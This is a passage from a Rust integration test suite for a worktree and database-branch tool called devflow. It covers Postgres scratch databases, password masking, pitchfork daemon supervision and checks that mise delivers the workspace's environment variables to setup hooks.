    assert_ne!(binding_a2.branch_id, binding_a.branch_id);
    connect(&binding_a2.url)
        .unwrap()
        .batch_execute("CREATE TABLE t(x int); INSERT INTO t SELECT generate_series(1, 7)")
        .unwrap();
    connect(&binding_b.url)
        .unwrap()
        .batch_execute("INSERT INTO t VALUES (99)")
        .unwrap();
    setup::reset_data(&t.project, &b.workspace, None).unwrap();
    assert_eq!(
        count(&binding_b.url),
        2,
        "the new feature/a (7 rows) is not b's source"
    );

    // A retry after a crash clones exactly the source the first attempt
    // pinned, even though `feature/a` now names another branch.
    let retry = worktree::create(&t.project, "retry", None).unwrap();
    let mut pinned = Receipt::new(t.project.id(), "retry", Some("main".into()));
    pinned.set_phase(Phase::Materialize, PhaseState::Done, None);
    pinned.data_source = Some("workspace:feature/a".into());
    pinned.data_source_id = Some(format!("branch:{}", binding_a.branch_id.unwrap()));
    pinned.save(&retry.git_dir).unwrap();
    let out = setup::setup(
        &t.project,
        &retry,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let binding_retry = binding(&out.receipt);
    assert_eq!(binding_retry.source, "workspace:feature/a");
    assert_eq!(
        count(&binding_retry.url),
        2,
        "the pinned branch, not the 7-row one"
    );

    // Removing b drops its branch; the kept branch of the old a and the root stay.
    let out = setup::remove(
        &t.project,
        "feature/b",
        RemoveOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, binding_b.branch_id);
    assert!(
        server
            .branch(binding_b.branch_id.unwrap())
            .unwrap()
            .is_none()
    );
    assert!(
        server
            .branch(binding_a.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    assert!(connect(&binding_b.url).is_err());

    // --keep-data leaves the branch behind.
    let out = setup::remove(
        &t.project,
        "feature/a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.dropped_branch, None);
    assert!(
        server
            .branch(binding_a2.branch_id.unwrap())
            .unwrap()
            .is_some()
    );
    server.down().unwrap();
}

/// `extra_databases` through the whole pipeline on a managed server: the URLs
/// reach `.devflow/env` and the hooks (masked in their output), the receipt
/// lists names and databases without a second copy of the password, a clone
/// and a reset leave them empty, a name added later is provisioned by the next
/// setup and a name removed leaves an orphan on the server, and removing the
/// workspace drops them (or keeps them with the data).
#[test]
#[ignore = "needs Docker and the postgres:18 image"]
fn managed_postgres_scratch_databases_reach_the_environment_and_follow_the_workspace() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"hook sees $TEST_DATABASE_URL\"",
                "echo \"$SHADOW_DATABASE_URL\" > .devflow/shadow-url",
            ],
            ..Default::default()
        },
        &format!("{MANAGED}extra_databases = [\"test\", \"shadow\"]\n"),
    );
    trust::approve(&t.project).unwrap();
    let _cleanup = managed_cleanup(&t.project);
    let connect = |url: &str| postgres::Client::connect(url, postgres::NoTls).unwrap();
    let tables = |url: &str| -> i64 {
        connect(url)
            .query_one(
                "SELECT count(*) FROM pg_tables WHERE schemaname = 'public'",
                &[],
            )
            .unwrap()
            .get(0)
    };
    let server = devflow_core::db::Server::for_project(&t.project)
        .unwrap()
        .unwrap();

    // The environment exports one URL per scratch database: the workspace's
    // login and password, another database.
    let mut rec = Recorder::default();
    let a = setup::create(
        &t.project,
        CreateRequest {
            name: "a".into(),
            from: None,
            options: SetupOptions {
                data_from: Some(DataSource::Empty),
                ..Default::default()
            },
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(a.status, Status::Ready, "{:?}", a.receipt.phases);
    let bound = binding(&a.receipt);
    let id = bound.branch_id.expect("a server-backed binding");
    let env = env_map(&a.workspace);
    let params = devflow_core::conn::Params::parse(&bound.url).unwrap();
    let password = params.password().unwrap().to_string();
    assert_eq!(
        bound.extras.keys().collect::<Vec<_>>(),
        ["shadow", "test"],
        "the receipt lists names and databases"
    );
    for (name, var) in [
        ("test", "TEST_DATABASE_URL"),
        ("shadow", "SHADOW_DATABASE_URL"),
    ] {
        let extra = &bound.extras[name];
        assert_eq!(env[var], bound.extra_url(name).unwrap());
        let scratch = devflow_core::conn::Params::parse(&env[var]).unwrap();
        assert_eq!(scratch.get("dbname"), Some(extra.database.as_str()));
        assert_ne!(extra.database, bound.database);
        assert_eq!(scratch.get("user"), Some(bound.role.as_str()));
        assert_eq!(scratch.password(), Some(password.as_str()));
        assert_eq!(
            connect(&env[var])
                .query_one("SELECT 1", &[])
                .unwrap()
                .get::<_, i32>(0),
            1
        );
    }
    let on_server = server.branch(id).unwrap().unwrap();
    assert_eq!(
        on_server
            .extras
            .iter()
            .map(|e| (e.name.as_str(), e.db_name.as_str()))
            .collect::<Vec<_>>(),
        [
            ("test", bound.extras["test"].database.as_str()),
            ("shadow", bound.extras["shadow"].database.as_str())
        ]
    );
    // No second copy of the password in the receipt, and the shown forms mask it.
    let listed = serde_json::to_string(&bound.extras).unwrap();
    assert!(!listed.contains(&password), "{listed}");
    for var in ["DATABASE_URL", "TEST_DATABASE_URL", "SHADOW_DATABASE_URL"] {
        assert!(
            !devflow_core::redact::text(&env[var]).contains(&password),
            "{var}"
        );
    }
    // Hooks see the variable, and their output is masked.
    assert_eq!(
        std::fs::read_to_string(a.workspace.path.join(".devflow/shadow-url"))
            .unwrap()
            .trim(),
        env["SHADOW_DATABASE_URL"]
    );
    let seen: Vec<_> = rec
        .lines
        .iter()
        .filter(|l| l.starts_with("hook sees"))
        .collect();
    assert_eq!(seen.len(), 1, "{:?}", rec.lines);
    assert!(!seen[0].contains(&password), "{}", seen[0]);

    // A clone gets its own, empty ones.
    connect(&env["TEST_DATABASE_URL"])
        .batch_execute("CREATE TABLE t (i int)")
        .unwrap();
    connect(&bound.url)
        .batch_execute("CREATE TABLE own (i int)")
        .unwrap();
    let b = create(
        &t.project,
        "b",
        SetupOptions {
            data_from: Some(DataSource::Workspace { name: "a".into() }),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(b.status, Status::Ready, "{:?}", b.receipt.phases);
    let env_b = env_map(&b.workspace);
    assert_eq!(
        tables(&env_b["DATABASE_URL"]),
        1,
        "the branch's own data is cloned"
    );
    assert_eq!(tables(&env_b["TEST_DATABASE_URL"]), 0);
    assert_eq!(tables(&env_b["SHADOW_DATABASE_URL"]), 0);
    assert_ne!(env_b["TEST_DATABASE_URL"], env["TEST_DATABASE_URL"]);
    assert_eq!(tables(&env["TEST_DATABASE_URL"]), 1, "a keeps its own");

    // A reset empties them again, under the same URLs.
    setup::reset_data(&t.project, &a.workspace, Some(DataSource::Empty)).unwrap();
    assert_eq!(tables(&env["DATABASE_URL"]), 0);
    assert_eq!(tables(&env["TEST_DATABASE_URL"]), 0);
    assert_eq!(
        env_map(&a.workspace)["TEST_DATABASE_URL"],
        env["TEST_DATABASE_URL"]
    );

    // A name added later: the workspace needs attention until setup provisions
    // it, on the branch it already has, without touching the others.
    connect(&env["TEST_DATABASE_URL"])
        .batch_execute("CREATE TABLE keep (i int)")
        .unwrap();
    let project = edit_config(&t, |text| {
        text.replace(
            "extra_databases = [\"test\", \"shadow\"]",
            "extra_databases = [\"test\", \"shadow\", \"e2e\"]",
        )
    });
    let listed = setup::list(&project).unwrap();
    let w = listed.iter().find(|w| w.workspace.name == "a").unwrap();
    assert_eq!(w.status, Some(Status::NeedsAttention));
    assert!(
        w.receipt
            .as_ref()
            .unwrap()
            .phase(Phase::Services)
            .detail
            .unwrap()
            .contains("'db' changed")
    );
    let done = setup::setup(
        &project,
        &a.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready, "{:?}", done.receipt.phases);
    let env = env_map(&a.workspace);
    assert_eq!(
        binding(&done.receipt).branch_id,
        Some(id),
        "the same branch"
    );
    assert_eq!(tables(&env["E2E_DATABASE_URL"]), 0);
    assert_eq!(
        tables(&env["TEST_DATABASE_URL"]),
        1,
        "existing scratch databases are not emptied by a setup"
    );
    // (A server handle carries the configuration it was made under.)
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    assert_eq!(server.reconcile().unwrap().orphans.len(), 0);

    // A name removed: no longer exported, still on the server as an orphan.
    let shadow_db = binding(&done.receipt).extras["shadow"].database.clone();
    let project = edit_config(&t, |text| {
        text.replace(
            "extra_databases = [\"test\", \"shadow\", \"e2e\"]",
            "extra_databases = [\"test\", \"e2e\"]",
        )
    });
    let done = setup::setup(
        &project,
        &a.workspace,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(done.status, Status::Ready, "{:?}", done.receipt.phases);
    let env = env_map(&a.workspace);
    assert!(!env.contains_key("SHADOW_DATABASE_URL"));
    assert!(!binding(&done.receipt).extras.contains_key("shadow"));
    let server = devflow_core::db::Server::for_project(&project)
        .unwrap()
        .unwrap();
    let orphans = server.reconcile().unwrap().orphans;
    assert!(
        orphans.len() == 2 && orphans.iter().any(|o| o.contains(&shadow_db)),
        "a's and b's: {orphans:?}"
    );

    // Removing a workspace drops its scratch databases with its branch;
    // `--keep-data` keeps all of it.
    let b_extras: Vec<String> = binding(&b.receipt)
        .extras
        .values()
        .map(|e| e.database.clone())
        .collect();
    let gone = setup::remove(&project, "b", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(gone.dropped_branch, binding(&b.receipt).branch_id);
    assert_eq!(b_extras.len(), 2);
    assert!(
        postgres::Client::connect(&env_b["TEST_DATABASE_URL"], postgres::NoTls).is_err(),
        "b's scratch databases went with its branch"
    );
    let a_test = env["TEST_DATABASE_URL"].clone();
    let kept = setup::remove(
        &project,
        "a",
        RemoveOptions {
            keep_data: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(kept.dropped_branch, None);
    assert_eq!(tables(&a_test), 1, "kept with the data");
    assert!(server.branch(id).unwrap().is_some());
    server.down().unwrap();
}

/// The pitchfork tests share one isolated supervisor, which each of them stops
/// when it ends: they run one at a time.
static PITCHFORK_TESTS: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
#[ignore = "needs pitchfork on PATH"]
fn pitchfork_lists_starts_and_stops_a_daemon() {
    use devflow_core::pitchfork::Pitchfork;
    use std::time::Duration;
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    let binary = pitchfork.path().to_path_buf();
    let _cleanup = Cleanup(Box::new(move || {
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));
    let dir = base.join("pf-project");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 600\"\n",
    )
    .unwrap();
    // The namespace file devflow writes: the daemon's id carries it.
    std::fs::write(
        dir.join("pitchfork.local.toml"),
        "namespace = \"df-00000000-00000001\"\nworktree_label = \"pf-project\"\n",
    )
    .unwrap();
    let mine = |pitchfork: &Pitchfork, dir: &Path| {
        pitchfork
            .list(dir)
            .unwrap()
            .into_iter()
            .filter(|d| d.namespace == "df-00000000-00000001")
            .collect::<Vec<_>>()
    };

    // Asking never starts a supervisor; a start does.
    assert!(!pitchfork.supervisor_up(&dir).unwrap_or(false));
    let sleeper = vec!["df-00000000-00000001/sleeper".to_string()];
    let ran = pitchfork
        .start(&dir, &sleeper, Duration::from_secs(60))
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert!(pitchfork.supervisor_up(&dir).unwrap());
    let found = mine(&pitchfork, &dir);
    assert_eq!(found.len(), 1, "{found:?}");
    assert_eq!(found[0].id, "df-00000000-00000001/sleeper");
    assert_eq!(found[0].status, "running");
    assert!(found[0].pid.is_some());
    // The proxy is off by default; the query works either way.
    assert!(!pitchfork.proxy_status(&dir).unwrap().enabled);

    let ran = pitchfork
        .stop(&dir, &sleeper, Duration::from_secs(60))
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    let found = mine(&pitchfork, &dir);
    assert!(found.iter().all(|d| d.status != "running"), "{found:?}");
    // Option-like and unqualified ids never reach pitchfork.
    for bad in ["--all", "--local", "sleeper", ""] {
        assert!(
            pitchfork
                .start(&dir, &[bad.to_string()], Duration::from_secs(5))
                .is_err(),
            "{bad:?}"
        );
    }
    assert!(pitchfork.start(&dir, &[], Duration::from_secs(5)).is_err());
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn pitchfork_start_and_stop_by_id_never_reach_a_parents_daemons() {
    use devflow_core::pitchfork::Pitchfork;
    use std::time::Duration;
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    let binary = pitchfork.path().to_path_buf();
    let _cleanup = Cleanup(Box::new(move || {
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));
    // `parent/` and `parent/child/` each have a configuration, as a worktree
    // inside another project does. pitchfork's `--local` from `child` selects
    // both projects' daemons; ids select exactly the ones named.
    let parent = base.join("pf-parent");
    let child = parent.join("pf-child");
    std::fs::create_dir_all(&child).unwrap();
    std::fs::write(
        parent.join("pitchfork.toml"),
        "namespace = \"pf-ns-parent\"\n[daemons.elder]\nrun = \"sleep 600\"\n",
    )
    .unwrap();
    std::fs::write(
        child.join("pitchfork.toml"),
        "namespace = \"pf-ns-child\"\n[daemons.younger]\nrun = \"sleep 601\"\n\
         [daemons.worker]\nrun = \"sleep 602\"\ndepends = [\"younger\"]\n",
    )
    .unwrap();
    let running = |pitchfork: &Pitchfork| {
        let mut ids: Vec<String> = pitchfork
            .list(&child)
            .unwrap()
            .into_iter()
            .filter(|d| d.status == "running")
            .map(|d| d.id)
            .collect();
        ids.sort();
        ids
    };
    let timeout = Duration::from_secs(60);

    // A dependency inside the namespace comes with the daemon asked for.
    let ran = pitchfork
        .start(&child, &["pf-ns-child/worker".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(
        running(&pitchfork),
        ["pf-ns-child/worker", "pf-ns-child/younger"],
        "the parent project's daemon was not started"
    );
    // Stopping one daemon by id leaves the other, and the parent's.
    let ran = pitchfork
        .start(&child, &["pf-ns-parent/elder".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    let ran = pitchfork
        .stop(&child, &["pf-ns-child/worker".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(
        running(&pitchfork),
        ["pf-ns-child/younger", "pf-ns-parent/elder"]
    );
    let ran = pitchfork
        .stop(&child, &["pf-ns-child/younger".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert_eq!(running(&pitchfork), ["pf-ns-parent/elder"]);
    let ran = pitchfork
        .stop(&child, &["pf-ns-parent/elder".to_string()], timeout)
        .unwrap();
    assert!(ran.ok, "{ran:?}");
    assert!(running(&pitchfork).is_empty());
}

/// Whether process `pid` is alive (`kill -0`).
fn process_alive(pid: u32) -> bool {
    std::process::Command::new("kill")
        .args(["-0", &pid.to_string()])
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

#[test]
#[ignore = "needs pitchfork on PATH"]
fn a_crashed_pitchfork_supervisor_does_not_authorize_removal_while_its_daemon_lives() {
    use devflow_core::pitchfork::Pitchfork;
    use devflow_core::processes::{self, Refusal, StartOptions, StopOptions};
    use std::sync::{Arc, Mutex};
    use std::time::{Duration, Instant};
    let _one_at_a_time = PITCHFORK_TESTS.lock().unwrap_or_else(|e| e.into_inner());
    let base = init();
    let pitchfork = Pitchfork::locate().expect(
        "pitchfork is not on PATH; try `mise x pitchfork@2.29.0 -- cargo test -p devflow-core --test workspace -- --ignored pitchfork`",
    );
    let detection = pitchfork.detect();
    assert!(detection.usable(), "{}", detection.summary());
    // Everything below happens in the isolated state `init` set up: this test
    // kills a supervisor, and it must only ever be its own.
    let state_dir = PathBuf::from(std::env::var_os("PITCHFORK_STATE_DIR").expect("isolated state"));
    assert!(state_dir.starts_with(base), "{}", state_dir.display());

    // The daemons this test starts are ended even when it fails.
    let strays: Arc<Mutex<Vec<u32>>> = Arc::default();
    let binary = pitchfork.path().to_path_buf();
    let for_cleanup = strays.clone();
    let _cleanup = Cleanup(Box::new(move || {
        for pid in for_cleanup.lock().unwrap().iter() {
            let _ = std::process::Command::new("kill")
                .args(["-9", &pid.to_string()])
                .stderr(std::process::Stdio::null())
                .status();
        }
        let _ = std::process::Command::new(&binary)
            .args(["supervisor", "stop"])
            .output();
    }));

    let t = repo(&Hooks::default(), "");
    std::fs::write(
        t.root.join("pitchfork.toml"),
        "[daemons.sleeper]\nrun = \"sleep 603\"\n",
    )
    .unwrap();
    commit_all(
        &git2::Repository::open(&t.root).unwrap(),
        "add a pitchfork daemon",
    );
    let project = Project::open(&t.root).unwrap();

    // A ready workspace with approved pitchfork files and its daemon started
    // through devflow, so the receipt records the start.
    let started = |name: &str| -> (Workspace, u32) {
        let made = create(&project, name, SetupOptions::default()).unwrap();
        assert_eq!(made.status, Status::Ready, "{:?}", made.receipt.phases);
        let workspace = made.workspace;
        let scope = trust::scope_at(&project, &workspace.path);
        trust::approve_scope_at(&project, &workspace.path, &scope).unwrap();
        let report = processes::start_with(
            Some(&pitchfork),
            &project,
            &workspace,
            &StartOptions::default(),
        )
        .unwrap();
        assert!(report.ok(), "{report:?}");
        let ns = receipt_of(&workspace).slug();
        let listed = pitchfork.list(&workspace.path).unwrap();
        let sleeper = listed
            .iter()
            .find(|d| d.namespace == ns && d.name == "sleeper")
            .unwrap_or_else(|| panic!("{listed:?}"));
        assert_eq!(sleeper.status, "running", "{sleeper:?}");
        let pid = sleeper.pid.expect("a running daemon has a pid");
        strays.lock().unwrap().push(pid);
        assert!(process_alive(pid));
        assert!(
            receipt_of(&workspace)
                .processes
                .is_some_and(|record| record.ids == [format!("{ns}/sleeper")]),
            "the start was recorded"
        );
        (workspace, pid)
    };
    // SIGKILL of the isolated supervisor alone (its pid is in the isolated
    // state file), then wait until pitchfork says it is down.
    let kill_supervisor = |workspace: &Workspace| {
        let state: toml::Table =
            toml::from_str(&std::fs::read_to_string(state_dir.join("state.toml")).unwrap())
                .unwrap();
        let pid = state["daemons"]["global/pitchfork"]["pid"]
            .as_integer()
            .expect("the supervisor's pid") as u32;
        assert!(process_alive(pid), "the supervisor of this test runs");
        assert!(
            std::process::Command::new("kill")
                .args(["-9", &pid.to_string()])
                .status()
                .unwrap()
                .success()
        );
        let deadline = Instant::now() + Duration::from_secs(10);
        while pitchfork.supervisor_up(&workspace.path).unwrap_or(false) {
            assert!(Instant::now() < deadline, "the supervisor did not go down");
            std::thread::sleep(Duration::from_millis(50));
        }
    };
    let removal = |force: bool| RemoveOptions {
        force,
        pitchfork: Some(pitchfork.clone()),
        ..RemoveOptions::default()
    };

    // 1. A crashed supervisor, daemon alive: removal without --force is
    //    refused, with --force it goes on and says the daemon may still run.
    let (a, daemon) = started("a");
    kill_supervisor(&a);
    assert!(process_alive(daemon), "the daemon survives its supervisor");
    let error = setup::remove(&project, "a", removal(false), &mut NoProgress).unwrap_err();
    let refused = protection(&error);
    assert!(refused.forceable, "{}", refused.reason);
    assert!(
        refused.reason.contains("supervisor is down"),
        "{}",
        refused.reason
    );
    assert!(a.path.exists(), "the workspace was not deleted");
    assert!(process_alive(daemon));
    let out = setup::remove(&project, "a", removal(true), &mut NoProgress).unwrap();
    assert!(!a.path.exists());
    assert!(
        out.warnings.iter().any(|w| w.contains("supervisor is down")
            && w.contains("may still be running and were not stopped")),
        "{:?}",
        out.warnings
    );
    assert!(
        process_alive(daemon),
        "a forced removal does not end it either"
    );

    // 2. The way out the refusal names: start the supervisor (it takes the
    //    surviving daemon back), then stop through devflow; the removal after
    //    that is clean.
    let (b, daemon) = started("b");
    kill_supervisor(&b);
    assert!(process_alive(daemon));
    let refusal =
        processes::stop_with(Some(&pitchfork), &project, &b, &StopOptions::default()).unwrap_err();
    assert!(
        matches!(
            refusal.downcast_ref::<Refusal>(),
            Some(Refusal::StateUnknown { .. })
        ),
        "{refusal:#}"
    );
    assert!(
        std::process::Command::new(pitchfork.path())
            .args(["supervisor", "start"])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .unwrap()
            .success()
    );
    let report =
        processes::stop_with(Some(&pitchfork), &project, &b, &StopOptions::default()).unwrap();
    assert!(report.ok(), "{report:?}");
    let deadline = Instant::now() + Duration::from_secs(10);
    while process_alive(daemon) {
        assert!(Instant::now() < deadline, "the daemon was not stopped");
        std::thread::sleep(Duration::from_millis(50));
    }
    assert!(
        receipt_of(&b).processes.is_none(),
        "a verified stop clears it"
    );
    let out = setup::remove(&project, "b", removal(false), &mut NoProgress).unwrap();
    assert!(!b.path.exists());
    assert!(
        !out.warnings
            .iter()
            .any(|w| w.contains("supervisor is down")),
        "{:?}",
        out.warnings
    );
}

#[allow(dead_code)]
fn _config_is_used(_: &Config) {}

#[test]
fn a_receiptless_worktree_recreated_in_place_is_never_removed_from_a_stale_view() {
    let t = repo(&Hooks::default(), "");
    // A checkout devflow never set up (no receipt), as shown in a list.
    let shown = worktree::create(&t.project, "plain", None).unwrap();
    let listed = worktree::find(&t.project, "plain").unwrap().unwrap();
    assert!(listed.fingerprint.is_some());
    let view = expecting(&listed, None);

    // Outside devflow: removed and recreated at the same path and branch,
    // then given work that must not be lost.
    worktree::remove(&t.project, &listed).unwrap();
    let again = worktree::create(&t.project, "plain", None).unwrap();
    assert_eq!(again.path, shown.path);
    std::fs::write(again.path.join("precious.txt"), "keep me").unwrap();

    for force in [false, true] {
        let error = setup::remove(
            &t.project,
            "plain",
            RemoveOptions {
                force,
                expect: Some(view.clone()),
                ..Default::default()
            },
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(!protection(&error).forceable, "{error:#}");
        assert!(error.to_string().contains("replaced"), "{error:#}");
        assert!(again.path.join("precious.txt").exists());
    }
}

// -- mise delivery, checked before the first setup hook ----------------------------------
//
// A hook that goes through mise has mise's `[env]` applied over the variables
// devflow gives it. The gate asks mise what the hook's process would see, with
// the environment the hook gets, for the hooks whose command runs mise; a hook
// that runs `devflow exec` inside mise needs no check. These tests run a real
// mise with state of its own.

/// Whether a real `mise` runs here; the tests that need one skip otherwise.
fn mise_installed() -> bool {
    std::process::Command::new("mise")
        .arg("--version")
        .output()
        .is_ok_and(|output| output.status.success())
}

/// The environment of a child test process that has mise state of its own:
/// everything below `base` (temporary directories included, so the only path
/// mise trusts is the one the repository lives under), and the stand-in
/// `devflow` first on PATH.
fn isolated_mise(base: &Path) -> Vec<(String, String)> {
    let path = |relative: &str| base.join(relative).display().to_string();
    let bin = base.join("bin");
    std::fs::create_dir_all(&bin).unwrap();
    // `devflow exec -- CMD` as the CLI does it: the workspace's variables from
    // `.devflow/env` on top of the environment, then CMD. (The real binary is
    // tested in the CLI's own tests; core cannot build it.)
    let devflow = bin.join("devflow");
    std::fs::write(
        &devflow,
        "#!/bin/sh\n[ \"$1\" = exec ] || exit 64\nshift\n[ \"$1\" = -- ] && shift\nset -a\n. \"$DEVFLOW_WORKSPACE_PATH/.devflow/env\"\nset +a\nexec \"$@\"\n",
    )
    .unwrap();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&devflow, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let original = std::env::var("PATH").unwrap_or_default();
    vec![
        ("TMPDIR".into(), path("tmp")),
        ("PATH".into(), format!("{}:{original}", bin.display())),
        ("HOME".into(), path("mise-state/home")),
        ("MISE_DATA_DIR".into(), path("mise-state/data")),
        ("MISE_CONFIG_DIR".into(), path("mise-state/config")),
        ("MISE_CACHE_DIR".into(), path("mise-state/cache")),
        ("MISE_STATE_DIR".into(), path("mise-state/state")),
        (
            "MISE_GLOBAL_CONFIG_FILE".into(),
            path("mise-state/config/config.toml"),
        ),
        (
            "MISE_SYSTEM_CONFIG_DIR".into(),
            path("mise-state/system-config"),
        ),
        (
            "MISE_SYSTEM_DATA_DIR".into(),
            path("mise-state/system-data"),
        ),
        (
            "MISE_TRUSTED_CONFIG_PATHS".into(),
            base.display().to_string(),
        ),
    ]
}

/// The start of a test that needs a real, isolated mise: `true` where the
/// body should run (the child process, started with that environment), and
/// `false` in the parent (which ran the child and checked it) or where mise
/// is missing.
fn with_real_mise(test: &str) -> bool {
    if std::env::var_os(CHILD).is_none() && !mise_installed() {
        eprintln!("skipped: mise is not installed");
        return false;
    }
    let base = tempfile::tempdir().unwrap();
    let base_path = base.path().canonicalize().unwrap();
    std::fs::create_dir_all(base_path.join("tmp")).unwrap();
    let env = isolated_mise(&base_path);
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    in_child(test, &env)
}

/// Write `files` in the main checkout and commit them.
fn commit_files(t: &Repo, files: &[(&str, &str)]) {
    for (name, text) in files {
        let path = t.root.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
    commit_all(&git2::Repository::open(&t.root).unwrap(), "mise");
}

/// Commit `mise.toml` (and `files`) in the main checkout.
fn commit_mise(t: &Repo, mise: &str, files: &[(&str, &str)]) {
    let mut all = vec![("mise.toml", mise)];
    all.extend_from_slice(files);
    commit_files(t, &all);
}

fn no_db(project: &Project) -> SetupOptions {
    SetupOptions {
        no_db: true,
        ..trusted(project)
    }
}

/// What the hook below writes: the `COMPOSE_PROJECT_NAME` it was given.
const SEEN: &str =
    "printf %s \"$COMPOSE_PROJECT_NAME\" > \"$DEVFLOW_WORKSPACE_PATH/.devflow/seen\"\n";
const MAIN: &str = "main-checkout";

/// A project whose only setup hook is `hook` (and `extra` appended to
/// `devflow.toml`), with the main checkout's own `COMPOSE_PROJECT_NAME` in a
/// `.env` that mise can load, and `seen.sh` committed next to `files`.
fn project_with_hook(hook: &str, extra: &str, files: &[(&str, &str)]) -> Repo {
    let t = repo(
        &Hooks {
            setup: &[hook],
            ..Default::default()
        },
        extra,
    );
    std::fs::write(
        t.root.join(".env"),
        format!("COMPOSE_PROJECT_NAME={MAIN}\n"),
    )
    .unwrap();
    trust::approve(&t.project).unwrap();
    let mut all = files.to_vec();
    all.push(("seen.sh", SEEN));
    commit_files(&t, &all);
    t
}

fn seen(w: &Workspace) -> Option<String> {
    std::fs::read_to_string(w.path.join(".devflow/seen")).ok()
}

fn hooks_record(out: &SetupOutcome) -> devflow_core::receipt::PhaseRecord {
    out.receipt.phase(Phase::Hooks)
}

const WIRED: &str = "[env]\n_.file = \".devflow/env\"\n";
const THROUGH_MISE: &str = "mise exec -- sh seen.sh";
const ROUTED: &str = "mise exec -- devflow exec -- sh seen.sh";

#[test]
fn hooks_wait_for_a_mise_that_hands_them_the_workspaces_variables() {
    // The reviewers' reproductions, against a real mise: mise's `[env]` is
    // applied over the variables devflow gives a command that goes through
    // mise, so a `.env` it loads after `.devflow/env` would hand a
    // postinstall script the main checkout's database.
    const NAME: &str = "hooks_wait_for_a_mise_that_hands_them_the_workspaces_variables";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_hook(THROUGH_MISE, "", &[]);
    let wired = WIRED;

    // Delivered: the hook runs, nothing is recorded.
    commit_mise(&t, wired, &[]);
    let ok = create(&t.project, "ok", no_db(&t.project)).unwrap();
    assert_eq!(ok.status, Status::Ready, "{:?}", ok.receipt.phases);
    assert_eq!(
        seen(&ok.workspace).as_deref(),
        env_map(&ok.workspace)
            .get("COMPOSE_PROJECT_NAME")
            .map(String::as_str)
    );
    assert!(ok.receipt.mise_check_skipped_at.is_none());
    assert!(ok.warnings.iter().all(|w| !w.contains("devflow exec")));

    // Reproduction 1: a repeated entry after `.devflow/env` wins.
    // Reproduction 2: `mise.local.toml` over the base wiring wins.
    // Reproduction 3: mise loads `.env` and not `.devflow/env` at all.
    for (name, mise, extra) in [
        (
            "dup",
            "[env]\n_.file = [\".env\", \".devflow/env\", \".env\"]\n",
            vec![],
        ),
        (
            "local",
            wired,
            vec![("mise.local.toml", "[env]\n_.file = \".env\"\n")],
        ),
        ("other", "[env]\n_.file = \".env\"\n", vec![]),
    ] {
        let _ = std::fs::remove_file(t.root.join("mise.local.toml"));
        commit_mise(&t, mise, &extra);
        let out = create(&t.project, name, no_db(&t.project)).unwrap();
        let hooks = hooks_record(&out);
        assert_eq!(out.status, Status::NeedsAttention, "{name}");
        assert!(
            hooks.state == PhaseState::Skipped && hooks.required_skip,
            "{name}: {hooks:?}"
        );
        let detail = hooks.detail.unwrap();
        assert!(
            detail.contains(
                "mise resolves COMPOSE_PROJECT_NAME from another source than .devflow/env"
            ) && detail.contains("mise.local.toml")
                && detail.contains("setup hook #1")
                && detail.contains("devflow exec")
                && detail.contains("skip this check"),
            "{name}: {detail}"
        );
        assert!(!detail.contains(MAIN), "no value: {detail}");
        assert_eq!(seen(&out.workspace), None, "{name}: no hook ran");
        assert!(out.hooks.is_none());

        // The escape hatch: the hook runs, and the receipt says nobody checked.
        let again = setup::setup(
            &t.project,
            &out.workspace,
            SetupOptions {
                skip_mise_check: true,
                ..no_db(&t.project)
            },
            false,
            false,
            &mut NoProgress,
        )
        .unwrap()
